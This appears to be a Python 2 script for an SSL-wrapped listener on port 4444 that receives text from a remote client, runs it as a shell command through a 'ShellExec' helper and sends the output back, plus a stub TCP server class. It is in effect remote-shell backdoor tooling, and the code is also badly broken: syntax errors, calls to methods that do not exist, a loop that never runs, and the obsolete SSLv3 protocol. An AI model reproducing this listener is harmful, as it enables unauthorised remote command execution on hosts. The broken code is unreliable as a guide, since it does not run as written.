from shellmisc import ShellExec
import socket, ssl, os

class SSLlistener:
   def __init__(self, lport = 4444, laddr = '',timeout = 5):
      self.lport = lport
      self.laddr = laddr
      self.timeout = timeout

#Creates a socket binds and listens for connections (5) of them
   def CreateServer Socket(self):
      try:
         self.s = socket.socket()
         self.s.bind((self.laddr, self.lport))
         self.s.listen(self.timeout)
         self.newsocket, self.fromaddr = self.s.accept()
         return self.newsocket

#wraps socket in ssl
   def WrapSocketinssl(self, socket)
      self.c = socket
      try:   
         self.c = ssl.wrap_socket(self.newsocket, server_side=True, certfile="server.pem", keyfile="server.key", ssl_version=ssl.PROTOCOL_SSLv3)
         print(str(self.newsocket) +' '+ str(self.fromaddr[0:]))
         return self.c
      except :
         return False


   def ReadFromSocket(self):
      self.data = self.c.read()
      self.s.listen(self.timeout)
      return  self.data


   def WriteToSocket(self,data, socket):
      self.writesocket = socket
      try:
         print(self.writesocket.write(data))
         return True
      except :
         return False


   def CloseSocket(self, socket):
      self.c = socket
      try:
         self.c.close()
         return True
      except :
         return False


   def StartupServer(self):
      if self.CreateSocket() == True:
         readdata = self.ReadFromSocket()
         print readdata
         return True
      else:   
         print "socket creation failed"
         return False
   
   def WaitForData(self):
	i = 0
	while i:
	  self.newsocket, self.fromaddr = self.s.accept()
	  while self.ReadFromSocket() != 'exit':
	  	print self.data
		if self.data != ' ':
			aShell = ShellEx(self.data)
			print aShell.GetStdout()
			self.WriteToSocket()
		self.CloseSocket()
		self.StartupServer()
          
      while self.CreateSocket() == True:
         socketdata = self.ReadFromSocket()
         print(socketdata)
         if socketdata == "exit":
            break
         else:
           pass
      print "connection dropped"
                
     
if __name__ == '__main__':
   sslear = SSLlistener()
   sslear.CloseSocket()
   sslear.StartupServer()
   while 1:
	sslear.WaitForData()	 	 




class TCPserver:
   def __init__(self, lport = 4444, laddr = '',timeout = 5):
      self.lport = lport
      self.laddr = laddr
      self.timeout = timeout

def Serversocket(self, port):
   s = socket.socket()
   host = socket.gethostname()
   s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   s.bind((host, port))        # Bind to the port
   s.listen(1)
   return s.accept()


#a = ServerSocket(4444)
#connection = a[0]
#print connection.recv(1024)
#connection.send('ok')

